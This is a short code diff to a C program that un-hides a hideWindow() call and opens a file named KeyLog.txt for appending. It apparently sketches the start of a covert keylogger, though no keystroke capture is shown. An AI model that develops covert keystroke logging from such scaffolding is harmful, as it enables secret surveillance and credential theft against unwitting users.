@@ -2,7 +2,11 @@
 
 int main(void)
 {
-    // hideWindow();
+    hideWindow();
+
+    FILE    *LogFile;
+
+    LogFile = fopen("C:\\Users\\Vicente\\Tmp\\KeyLog.txt", "a+");
 
     return 0;
 }
